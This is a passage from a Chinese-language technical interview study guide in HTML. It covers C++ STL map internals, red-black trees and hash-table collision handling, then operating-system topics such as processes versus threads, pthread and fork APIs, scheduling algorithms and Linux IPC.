table为底层机制实现的称为hash_map。map的架构如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566380621064.png" alt=""></p><p>map的在构造时缺省采用递增排序key，也使用alloc配置器配置空间大小，需要注意的是在插入元素时，调用的是红黑树中的insert_unique()方法，而非insert_euqal()（multimap使用）</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> maps<span class="token punctuation">;</span>    <span class="token comment">//插入若干元素</span>maps<span class="token punctuation">[</span><span class="token string">"jack"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>maps<span class="token punctuation">[</span><span class="token string">"jane"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>maps<span class="token punctuation">[</span><span class="token string">"july"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">//以pair形式插入</span>pair<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token string">"david"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>maps<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//迭代输出元素</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>iterator iter <span class="token operator">=</span> maps<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> iter <span class="token operator">!=</span> maps<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>iter<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> iter<span class="token operator">-></span>first <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> iter<span class="token operator">-></span>second <span class="token operator">&lt;&lt;</span> <span class="token string">"--"</span><span class="token punctuation">;</span> <span class="token comment">//david 4--jack 1--jane 2--july 3--</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token comment">//使用subscipt操作取实值</span><span class="token keyword">int</span> num <span class="token operator">=</span> maps<span class="token punctuation">[</span><span class="token string">"july"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> num <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 3</span><span class="token comment">//查找某key</span>iter <span class="token operator">=</span> maps<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"jane"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>iter <span class="token operator">!=</span> maps<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> iter<span class="token operator">-></span>second <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 2</span>    <span class="token comment">//修改实值</span>iter<span class="token operator">-></span>second <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token keyword">int</span> num2 <span class="token operator">=</span> maps<span class="token punctuation">[</span><span class="token string">"jane"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 100</span>cout <span class="token operator">&lt;&lt;</span> num2 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>需要注意的是subscript（下标）操作既可以作为左值运用（修改内容）也可以作为右值运用（获取实值）。例如：</p><pre class="language-c" data-language="c"><code class="language-c">maps<span class="token punctuation">[</span><span class="token string">"abc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//左值运用</span><span class="token keyword">int</span> num <span class="token operator">=</span> masp<span class="token punctuation">[</span><span class="token string">"abd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//右值运用</span></code></pre><p>无论如何，subscript操作符都会先根据键值找出实值，源码如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>T<span class="token operator">&amp;</span> operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> key_type<span class="token operator">&amp;</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">value_type</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>代码运行过程是：首先根据键值和实值做出一个元素，这个元素的实值未知，因此产生一个与实值型别相同的临时对象替代：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">value_type</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>再将这个对象插入到map中，并返回一个pair：</p><pre class="language-c" data-language="c"><code class="language-c">pair<span class="token operator">&lt;</span>iterator<span class="token punctuation">,</span>bool<span class="token operator">></span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">value_type</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>pair第一个元素是迭代器，指向当前插入的新元素，如果插入成功返回true，此时对应左值运用，根据键值插入实值。插入失败（重复插入）返回false，此时返回的是已经存在的元素，则可以取到它的实值</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">value_type</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span> <span class="token comment">//迭代器</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">value_type</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//解引用</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">value_type</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span> <span class="token comment">//取出实值</span></code></pre><p>由于这个实值是以引用方式传递，因此作为左值或者右值都可以</p><blockquote><p>《STL源码剖析》 侯捷 </p></blockquote><h4 id="215、set和map的区别，multimap和multiset的区别"><a href="#215、set和map的区别，multimap和multiset的区别" class="headerlink" title="215、set和map的区别，multimap和multiset的区别"></a>215、set和map的区别，multimap和multiset的区别</h4><p>set只提供一种数据类型的接口，但是会将这一个元素分配到key和value上，而且它的compare_function用的是 identity()函数，这个函数是输入什么输出什么，这样就实现了set机制，set的key和value其实是一样的了。其实他保存的是两份元素，而不是只保存一份元素</p><p>map则提供两种数据类型的接口，分别放在key和value的位置上，他的比较function采用的是红黑树的comparefunction（），保存的确实是两份元素。</p><p>他们两个的insert都是采用红黑树的insert_unique() 独一无二的插入 。</p><p>multimap和map的唯一区别就是：multimap调用的是红黑树的insert_equal(),可以重复插入而map调用的则是独一无二的插入insert_unique()，multiset和set也一样，底层实现都是一样的，只是在插入的时候调用的方法不一样。</p><p><strong>红黑树概念</strong></p><p>面试时候现场写红黑树代码的概率几乎为0，但是红黑树一些基本概念还是需要掌握的。</p><p>1、它是二叉排序树（继承二叉排序树特显）：</p><ul><li><p>若左子树不空，则左子树上所有结点的值均小于或等于它的根结点的值。 </p></li><li><p>若右子树不空，则右子树上所有结点的值均大于或等于它的根结点的值。 </p></li></ul><ul><li>左、右子树也分别为二叉排序树。 </li></ul><p>2、它满足如下几点要求： </p><ul><li><p>树中所有节点非红即黑。 </p></li><li><p>根节点必为黑节点。 </p></li></ul><ul><li>红节点的子节点必为黑（黑节点子节点可为黑）。 </li></ul><ul><li>从根到NULL的任何路径上黑结点数相同。 </li></ul><p>3、查找时间一定可以控制在O(logn)。 </p><h4 id="216、STL中unordered-map和map的区别和应用场景"><a href="#216、STL中unordered-map和map的区别和应用场景" class="headerlink" title="216、STL中unordered_map和map的区别和应用场景"></a>216、STL中unordered_map和map的区别和应用场景</h4><p>map支持键值的自动排序，底层机制是红黑树，红黑树的查询和维护时间复杂度均为$O(logn)$，但是空间占用比较大，因为每个节点要保持父节点、孩子节点及颜色的信息</p><p>unordered_map是c 11新添加的容器，底层机制是哈希表，通过hash函数计算元素位置，其查询时间复杂度为O(1)，维护时间与bucket桶所维护的list长度有关，但是建立hash表耗时较大</p><p>从两者的底层机制和特点可以看出：map适用于有序数据的应用场景，unordered_map适用于高效查询的应用场景</p><h4 id="217、hashtable中解决冲突有哪些方法？"><a href="#217、hashtable中解决冲突有哪些方法？" class="headerlink" title="217、hashtable中解决冲突有哪些方法？"></a>217、hashtable中解决冲突有哪些方法？</h4><p><strong>记住前三个：</strong></p><p>线性探测</p><p>使用hash函数计算出的位置如果已经有元素占用了，则向后依次寻找，找到表尾则回到表头，直到找到一个空位</p><p><strong>开链</strong></p><p>每个表格维护一个list，如果hash函数计算出的格子相同，则按顺序存在这个list中</p><p><strong>再散列</strong></p><p>发生冲突时使用另一种hash函数再计算一个地址，直到不冲突</p><p><strong>二次探测</strong></p><p>使用hash函数计算出的位置如果已经有元素占用了，按照$1^2$、$2^2$、$3^2$…的步长依次寻找，如果步长是随机数序列，则称之为伪随机探测</p><p><strong>公共溢出区</strong></p><p>一旦hash函数计算的结果相同，就放入公共溢出区</p><p><a id="os"></a></p><h1 id="disappointed-relieved-操作系统"><a href="#disappointed-relieved-操作系统" class="headerlink" title=":disappointed_relieved:操作系统"></a>:disappointed_relieved:操作系统</h1><h4 id="1、进程、线程和协程的区别和联系"><a href="#1、进程、线程和协程的区别和联系" class="headerlink" title="1、进程、线程和协程的区别和联系"></a>1、进程、线程和协程的区别和联系</h4><div class="table-container"><table><thead><tr><th></th><th>进程</th><th>线程</th><th>协程</th></tr></thead><tbody><tr><td>定义</td><td>资源分配和拥有的基本单位</td><td>程序执行的基本单位</td><td>用户态的轻量级线程，线程内部调度的基本单位</td></tr><tr><td>切换情况</td><td>进程CPU环境(栈、寄存器、页表和文件句柄等)的保存以及新调度的进程CPU环境的设置</td><td>保存和设置程序计数器、少量寄存器和栈的内容</td><td>先将寄存器上下文和栈保存，等切换回来的时候再进行恢复</td></tr><tr><td>切换者</td><td>操作系统</td><td>操作系统</td><td>用户</td></tr><tr><td>切换过程</td><td>用户态-&gt;内核态-&gt;用户态</td><td>用户态-&gt;内核态-&gt;用户态</td><td>用户态(没有陷入内核)</td></tr><tr><td>调用栈</td><td>内核栈</td><td>内核栈</td><td>用户栈</td></tr><tr><td>拥有资源</td><td>CPU资源、内存资源、文件资源和句柄等</td><td>程序计数器、寄存器、栈和状态字</td><td>拥有自己的寄存器上下文和栈</td></tr><tr><td>并发性</td><td>不同进程之间切换实现并发，各自占有CPU实现并行</td><td>一个进程内部的多个线程并发执行</td><td>同一时间只能执行一个协程，而其他协程处于休眠状态，适合对任务进行分时处理</td></tr><tr><td>系统开销</td><td>切换虚拟地址空间，切换内核栈和硬件上下文，CPU高速缓存失效、页表切换，开销很大</td><td>切换时只需保存和设置少量寄存器内容，因此开销很小</td><td>直接操作栈则基本没有内核切换的开销，可以不加锁的访问全局变量，所以上下文的切换非常快</td></tr><tr><td>通信方面</td><td>进程间通信需要借助操作系统</td><td>线程间可以直接读写进程数据段(如全局变量)来进行通信</td><td>共享内存、消息队列</td></tr></tbody></table></div><p>1、进程是资源调度的基本单位，运行一个可执行程序会创建一个或多个进程，进程就是运行起来的可执行程序</p><p>2、线程是程序执行的基本单位，是轻量级的进程。每个进程中都有唯一的主线程，且只能有一个，主线程和进程是相互依存的关系，主线程结束进程也会结束。多提一句：协程是用户态的轻量级线程，线程内部调度的基本单位</p><h4 id="2、线程与进程的比较"><a href="#2、线程与进程的比较" class="headerlink" title="2、线程与进程的比较"></a>2、线程与进程的比较</h4><p>1、线程启动速度快，轻量级   </p><p>2、线程的系统开销小   </p><p>3、线程使用有一定难度，需要处理数据一致性问题</p><p>4、同一线程共享的有堆、全局变量、静态变量、指针，引用、文件等，而独自占有栈</p><h4 id="3、一个进程可以创建多少线程，和什么有关？"><a href="#3、一个进程可以创建多少线程，和什么有关？" class="headerlink" title="3、一个进程可以创建多少线程，和什么有关？"></a>3、一个进程可以创建多少线程，和什么有关？</h4><p>理论上，一个进程可用虚拟空间是2G，默认情况下，线程的栈的大小是1MB，所以理论上最多只能创建2048个线程。如果要创建多于2048的话，必须修改编译器的设置。</p><p>因此，一个进程可以创建的线程数由可用虚拟空间和线程的栈的大小共同决定，只要虚拟空间足够，那么新线程的建立就会成功。如果需要创建超过2K以上的线程，减小你线程栈的大小就可以实现了，虽然在一般情况下，你不需要那么多的线程。过多的线程将会导致大量的时间浪费在线程切换上，给程序运行效率带来负面影响。</p><blockquote><p>《一个进程到底能创建多少线程》：<a href="https://www.cnblogs.com/Leo_wl/p/5969621.html">https://www.cnblogs.com/Leo_wl/p/5969621.html</a></p></blockquote><h4 id="4、外中断和异常有什么区别？"><a href="#4、外中断和异常有什么区别？" class="headerlink" title="4、外中断和异常有什么区别？"></a>4、外中断和异常有什么区别？</h4><p>外中断是指由 CPU 执行指令以外的事件引起，如 I/O 完成中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。</p><p>而异常时由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等。</p><h4 id="5、进程线程模型你知道多少？"><a href="#5、进程线程模型你知道多少？" class="headerlink" title="5、进程线程模型你知道多少？"></a>5、进程线程模型你知道多少？</h4><p>对于进程和线程的理解和把握可以说基本奠定了对系统的认知和把控能力。其核心意义绝不仅仅是“线程是调度的基本单位，进程是资源分配的基本单位”这么简单。</p><h5 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h5><p>我们这里讨论的是用户态的多线程模型，同一个进程内部有多个线程，所有的线程共享同一个进程的内存空间，进程中定义的全局变量会被所有的线程共享，比如有全局变量int i = 10，这一进程中所有并发运行的线程都可以读取和修改这个i的值，而多个线程被CPU调度的顺序又是不可控的，所以对临界资源的访问尤其需要注意安全。</p><p>我们必须知道，<strong>做一次简单的i = i + 1在计算机中并不是原子操作，涉及内存取数，计算和写入内存几个环节，</strong>而线程的切换有可能发生在上述任何一个环节中间，所以不同的操作顺序很有可能带来意想不到的结果。</p><p>但是，虽然线程在安全性方面会引入许多新挑战，但是线程带来的好处也是有目共睹的。首先，原先顺序执行的程序（暂时不考虑多进程）可以被拆分成几个独立的逻辑流，这些逻辑流可以独立完成一些任务（最好这些任务是不相关的）。</p><p>比如 QQ 可以一个线程处理聊天一个线程处理上传文件，两个线程互不干涉，在用户看来是同步在执行两个任务，试想如果线性完成这个任务的话，在数据传输完成之前用户聊天被一直阻塞会是多么尴尬的情况。</p><p>对于线程，我认为弄清以下两点非常重要：</p><ul><li><p>线程之间有无先后访问顺序（线程依赖关系）</p></li><li><p>多个线程共享访问同一变量（同步互斥问题）</p></li></ul><p>另外，我们通常只会去说同一进程的多个线程共享进程的资源，但是每个线程特有的部分却很少提及，除了标识线程的tid，每个线程还有自己独立的栈空间，线程彼此之间是无法访问其他线程栈上内容的。</p><p>而作为处理机调度的最小单位，线程调度只需要保存线程栈、寄存器数据和PC即可，相比进程切换开销要小很多。</p><p>线程相关接口不少，主要需要了解各个参数意义和返回值意义。</p><ol><li><p>线程创建和结束</p><ul><li><p>背景知识：</p><p>在一个文件内的多个函数通常都是按照main函数中出现的顺序来执行，但是在分时系统下，我们可以让每个函数都作为一个逻辑流并发执行，最简单的方式就是采用多线程策略。在main函数中调用多线程接口创建线程，每个线程对应特定的函数（操作），这样就可以不按照main函数中各个函数出现的顺序来执行，避免了忙等的情况。线程基本操作的接口如下。</p></li><li><p>相关接口：</p><ul><li><p>创建线程：int pthread_create(pthread_t <em>pthread, const pthread_attr_t </em>attr, void <em>(</em>start_routine)(void <em>), void </em>agr);</p><p>创建一个新线程，pthread和start_routine不可或缺，分别用于标识线程和执行体入口，其他可以填NULL。</p><ul><li><p>pthread：用来返回线程的tid，*pthread值即为tid，类型pthread_t == unsigned long int。</p></li><li><p>attr：指向线程属性结构体的指针，用于改变所创线程的属性，填NULL使用默认值。</p></li><li><p>start_routine：线程执行函数的首地址，传入函数指针。</p></li><li><p>arg：通过地址传递来传递函数参数，这里是无符号类型指针，可以传任意类型变量的地址，在被传入函数中先强制类型转换成所需类型即可。</p></li></ul></li><li><p>获得线程ID：pthread_t pthread_self();</p><p>调用时，会打印线程ID。</p></li><li><p>等待线程结束：int pthread_join(pthread_t tid, void** retval);</p><p>主线程调用，等待子线程退出并回收其资源，类似于进程中wait/waitpid回收僵尸进程，调用pthread_join的线程会被阻塞。</p><ul><li><p>tid：创建线程时通过指针得到tid值。</p></li><li><p>retval：指向返回值的指针。</p></li></ul></li><li><p>结束线程：pthread_exit(void *retval);</p><p>子线程执行，用来结束当前线程并通过retval传递返回值，该返回值可通过pthread_join获得。</p><ul><li>retval：同上。</li></ul></li><li><p>分离线程：int pthread_detach(pthread_t tid);</p><p>主线程、子线程均可调用。主线程中pthread_detach(tid)，子线程中pthread_detach(pthread_self())，调用后和主线程分离，子线程结束时自己立即回收资源。</p><ul><li>tid：同上。</li></ul></li></ul></li></ul></li><li><p>线程属性值修改</p><ul><li><p>背景知识：</p><p>线程属性对象类型为pthread_attr_t，结构体定义如下：</p><pre class="language-C" data-language="C"><code class="language-C">typedef struct&#123;    int etachstate;    &#x2F;&#x2F; 线程分离的状态    int schedpolicy;    &#x2F;&#x2F; 线程调度策略    struct sched_param schedparam;    &#x2F;&#x2F; 线程的调度参数    int inheritsched;    &#x2F;&#x2F; 线程的继承性    int scope;    &#x2F;&#x2F; 线程的作用域    &#x2F;&#x2F; 以下为线程栈的设置    size_t guardsize;    &#x2F;&#x2F; 线程栈末尾警戒缓冲大小    int stackaddr_set;    &#x2F;&#x2F; 线程的栈设置    void *    stackaddr;    &#x2F;&#x2F; 线程栈的位置    size_t stacksize;    &#x2F;&#x2F; 线程栈大小&#125;pthread_arrt_t;</code></pre></li><li><p>相关接口：</p><p>对上述结构体中各参数大多有：pthread_attr_get()和pthread_attr_set()系统调用函数来设置和获取。这里不一一罗列。</p></li></ul></li></ol><h5 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h5><p>每一个进程是资源分配的基本单位。</p><p>进程结构由以下几个部分组成：代码段、堆栈段、数据段。代码段是静态的二进制代码，多个程序可以共享。</p><p>实际上在父进程创建子进程之后，父、子进程除了pid外，几乎所有的部分几乎一样。</p><p>父、子进程共享全部数据，但并不是说他们就是对同一块数据进行操作，子进程在读写数据时会通过写时复制机制将公共的数据重新拷贝一份，之后在拷贝出的数据上进行操作。</p><p>如果子进程想要运行自己的代码段，还可以通过调用execv()函数重新加载新的代码段，之后就和父进程独立开了。</p><p>我们在shell中执行程序就是通过shell进程先fork()一个子进程再通过execv()重新加载新的代码段的过程。</p><ol><li><p>进程创建与结束</p><ul><li><p>背景知识：</p><p>进程有两种创建方式，一种是操作系统创建的一种是父进程创建的。从计算机启动到终端执行程序的过程为：0号进程 -&gt; 1号内核进程 -&gt; 1号用户进程(init进程) -&gt; getty进程 -&gt; shell进程 -&gt; 命令行执行进程。所以我们在命令行中通过 ./program执行可执行文件时，所有创建的进程都是shell进程的子进程，这也就是为什么shell一关闭，在shell中执行的进程都自动被关闭的原因。从shell进程到创建其他子进程需要通过以下接口。</p></li><li><p>相关接口：</p><ul><li><p>创建进程：pid_t fork(void);</p><p>返回值：出错返回-1；父进程中返回pid &gt; 0；子进程中pid == 0</p></li><li><p>结束进程：void exit(int status);</p><ul><li>status是退出状态，保存在全局变量中S?，通常0表示正常退出。</li></ul></li><li><p>获得PID：pid_t getpid(void);</p><p>返回调用者pid。</p></li><li><p>获得父进程PID：pid_t getppid(void);</p><p>返回父进程pid。</p></li></ul></li><li><p>其他补充：</p><ul><li><p>正常退出方式：exit()、_exit()、return（在main中）。</p><p>exit()和_exit()区别：exit()是对__exit()的封装，都会终止进程并做相关收尾工作，最主要的区别是_exit()函数关闭全部描述符和清理函数后不会刷新流，但是exit()会在调用_exit()函数前刷新数据流。</p><p>return和exit()区别：exit()是函数，但有参数，执行完之后控制权交给系统。return若是在调用函数中，执行完之后控制权交给调用进程，若是在main函数中，控制权交给系统。</p></li><li><p>异常退出方式：abort()、终止信号。</p></li></ul></li></ul></li><li><p>Linux进程控制</p></li></ol><ul><li><p>进程地址空间（地址空间）</p><p>虚拟存储器为每个进程提供了独占系统地址空间的假象。</p><p>尽管每个进程地址空间内容不尽相同，但是他们的都有相似的结构。X86 Linux进程的地址空间底部是保留给用户程序的，包括文本、数据、堆、栈等，其中文本区和数据区是通过存储器映射方式将磁盘中可执行文件的相应段映射至虚拟存储器地址空间中。</p><p>有一些”敏感”的地址需要注意下，对于32位进程来说，代码段从0x08048000开始。从0xC0000000开始到0xFFFFFFFF是内核地址空间，通常情况下代码运行在用户态（使用0x00000000 ~ 0xC00000000的用户地址空间），当发生系统调用、进程切换等操作时CPU控制寄存器设置模式位，进入内和模式，在该状态（超级用户模式）下进程可以访问全部存储器位置和执行全部指令。</p><p>也就说32位进程的地址空间都是4G，但用户态下只能访问低3G的地址空间，若要访问3G ~ 4G的地址空间则只有进入内核态才行。</p></li><li><p>进程控制块（处理机）</p><p>进程的调度实际就是内核选择相应的进程控制块，被选择的进程控制块中包含了一个进程基本的信息。</p></li><li><p>上下文切换</p><p>内核管理所有进程控制块，而进程控制块记录了进程全部状态信息。每一次进程调度就是一次上下文切换，所谓的上下文本质上就是当前运行状态，主要包括通用寄存器、浮点寄存器、状态寄存器、程序计数器、用户栈和内核数据结构（页表、进程表、文件表）等。</p><p>进程执行时刻，内核可以决定抢占当前进程并开始新的进程，这个过程由内核调度器完成，当调度器选择了某个进程时称为该进程被调度，该过程通过上下文切换来改变当前状态。</p><p>一次完整的上下文切换通常是进程原先运行于用户态，之后因系统调用或时间片到切换到内核态执行内核指令，完成上下文切换后回到用户态，此时已经切换到进程B。</p></li></ul><h4 id="6、进程调度算法你了解多少？"><a href="#6、进程调度算法你了解多少？" class="headerlink" title="6、进程调度算法你了解多少？"></a>6、进程调度算法你了解多少？</h4><p>1、 <strong>先来先服务 first-come first-serverd（FCFS）</strong>  </p><p>非抢占式的调度算法，按照请求的顺序进行调度。</p><p>有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。</p><p>2、 <strong>短作业优先 shortest job first（SJF）</strong>  </p><p>非抢占式的调度算法，按估计运行时间最短的顺序进行调度。</p><p>长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度。</p><p>3、<strong>最短剩余时间优先 shortest remaining time next（SRTN）</strong>  </p><p>最短作业优先的抢占式版本，按剩余运行时间的顺序进行调度。 当一个新的作业到达时，其整个运行时间与当前进程的剩余时间作比较。</p><p>如果新的进程需要的时间更少，则挂起当前进程，运行新的进程。否则新的进程等待。</p><p>4、<strong>时间片轮转</strong>  </p><p>将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。</p><p>当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程。</p><p>时间片轮转算法的效率和时间片的大小有很大关系：</p><ul><li>因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。</li><li>而如果时间片过长，那么实时性就不能得到保证。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226224728.png" alt=""></p><p>5、<strong>优先级调度</strong>  </p><p>为每个进程分配一个优先级，按优先级进行调度。</p><p>为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级。</p><p>6、<strong>多级反馈队列</strong>  </p><p>一个进程需要执行 100 个时间片，如果采用时间片轮转调度算法，那么需要交换 100 次。</p><p>多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。</p><p>这种方式下，之前的进程只需要交换 7 次。每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。</p><p>可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226224803.png" alt=""></p><h4 id="7、Linux下进程间通信方式？"><a href="#7、Linux下进程间通信方式？" class="headerlink" title="7、Linux下进程间通信方式？"></a>7、Linux下进程间通信方式？</h4><ul><li><p>管道：</p><ul><li><p>无名管道（内存文件）：管道是一种半双工的通信方式，数据只能单向流动，而且只能在具有亲缘关系的进程之间使用。进程的亲缘关系通常是指父子进程关系。</p></li><li><p>有名管道（FIFO文件，借助文件系统）：有名管道也是半双工的通信方式，但是允许在没有亲缘关系的进程之间使用，管道是先进先出的通信方式。</p></li></ul></li><li><p>共享内存：共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的IPC方式，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与信号量，配合使用来实现进程间的同步和通信。</p></li><li><p>消息队列：消息队列是有消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。</p></li><li><p>套接字：适用于不同机器间进程通信，在本地也可作为两个进程通信的方式。</p></li><li><p>信号：用于通知接收进程某个事件已经发生，比如按下ctrl + C就是信号。</p></li><li><p>信号量：信号量是一个计数器，可以用来控制多个进程对共享资源的访问。它常作为一种锁机制，实现进程、线程的对临界区的同步及互斥访问。</p></li></ul><h4 id="8、Linux下同步机制？"><a href="#8、Linux下同步机制？" class="headerlink" title="8、Linux下同步机制？"></a>8、Linux下同步机制？</h4><ul><li><p>POSIX信号量：可用于进程同步，也可用于线程同步。</p></li><li><p>POSIX互斥锁 + 条件变量：只能用于线程同步。</p></li></ul><ol><li><p>线程和进程的区别？</p><ul><li><p>调度：线程是调度的基本单位（PC，状态码，通用寄存器，线程栈及栈指针）；进程是拥有资源的基本单位（打开文件，堆，静态区，代码段等）。</p></li><li><p>并发性：一个进程内多个线程可以并发（最好和CPU核数相等）；多个进程可以并发。</p></li><li><p>拥有资源：线程不拥有系统资源，但一个进程的多个线程可以共享隶属进程的资源；进程是拥有资源的独立单位。</p></li><li><p>系统开销：线程创建销毁只需要处理PC值，状态码，通用寄存器值，线程栈及栈指针即可；进程创建和销毁需要重新分配及销毁task_struct结构。</p></li></ul></li></ol><h4 id="9、如果系统中具有快表后，那么地址的转换过程变成什么样了？"><a href="#9、如果系统中具有快表后，那么地址的转换过程变成什么样了？" class="headerlink" 